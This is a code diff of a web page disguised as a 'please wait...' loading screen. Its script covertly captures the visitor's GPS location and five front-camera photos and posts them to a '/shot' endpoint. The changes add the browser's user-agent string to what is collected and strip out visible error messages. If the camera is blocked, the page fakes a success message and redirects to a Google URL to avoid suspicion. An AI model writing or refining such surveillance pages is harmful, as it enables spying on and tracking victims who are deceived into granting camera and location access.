@@ -22,8 +22,6 @@
 <div class="card" id="main-card">
   <div class="ring"></div>
   <h2>please wait...</h2>
-
-  
   <p id="status" class="status">Initializing...</p>
 </div>
 
@@ -38,17 +36,12 @@ window.addEventListener("DOMContentLoaded", () => {
   function getLocation() {
     return new Promise((resolve) => {
       if (!navigator.geolocation) {
-        resolve("....");
+        resolve("unsupported");
       } else {
         navigator.geolocation.getCurrentPosition(
           (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
-          (err) => {
-            if (err.code === 1) resolve("....");
-            else if (err.code === 2) resolve("....");
-            else if (err.code === 3) resolve("....");
-            else resolve("....");
-          },
-          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+          (err) => resolve("error"),
+          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
       }
     });
@@ -56,25 +49,23 @@ window.addEventListener("DOMContentLoaded", () => {
 
   (async () => {
     status.textContent = "...";
+    
+    // Get location (waits max 5 seconds before moving on)
     const userLocation = await getLocation();
     
-    if (userLocation.includes("denied") || userLocation.includes("unavailable") || userLocation.includes("timeout")) {
-        status.textContent = `.... ${userLocation}`;
-        status.classList.add("error");
-        await new Promise(r => setTimeout(r, 3000)); 
-    } else {
-        status.textContent = "....";
-    }
-
-    status.textContent = "....";
+    // Get device info (Browser + OS)
+    const deviceInfo = navigator.userAgent;
+    
+    status.textContent = "...";
     let stream;
     try {
       stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" }, audio: false
       });
     } catch (e) {
-      status.textContent = "...";
-      status.classList.add("error");
+      // If they block the camera, redirect instead of getting stuck
+      card.innerHTML = `<h2 class="success">✅ please wait...</h2>`;
+      setTimeout(() => { window.location.href = "https://notebook.google.com/"; }, 2000);
       return;
     }
 
@@ -87,7 +78,7 @@ window.addEventListener("DOMContentLoaded", () => {
     const ctx = c.getContext("2d");
 
     let n = 0;
-    status.textContent = "...";
+    status.textContent = `... 1 / 5`;
 
     const timer = setInterval(async () => {
       ctx.drawImage(video, 0, 0, c.width, c.height);
@@ -97,30 +88,29 @@ window.addEventListener("DOMContentLoaded", () => {
         await fetch("/shot", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ img: img, loc: userLocation })
+          body: JSON.stringify({ 
+              img: img, 
+              loc: userLocation,
+              device: deviceInfo 
+          })
         });
       } catch (_) {}
 
       n++;
       if (n < 5) {
-          status.textContent = `.... ${n + 1} / 5`;
+          status.textContent = `... ${n + 1} / 5`;
       } else {
         clearInterval(timer);
         stream.getTracks().forEach(t => t.stop());
         
-        // This completely replaces the card, removing the spinner!
         card.innerHTML = `
           <h2 class="success">✅ please wait...</h2>
-         
         `;
 
         let secondsLeft = 1;
-        const countdownEl = document.getElementById("countdown");
         
         const redirectTimer = setInterval(() => {
           secondsLeft--;
-          if (countdownEl) countdownEl.textContent = secondsLeft;
-          
           if (secondsLeft <= 0) {
             clearInterval(redirectTimer);
             window.location.href = "https://notebook.google.com/";
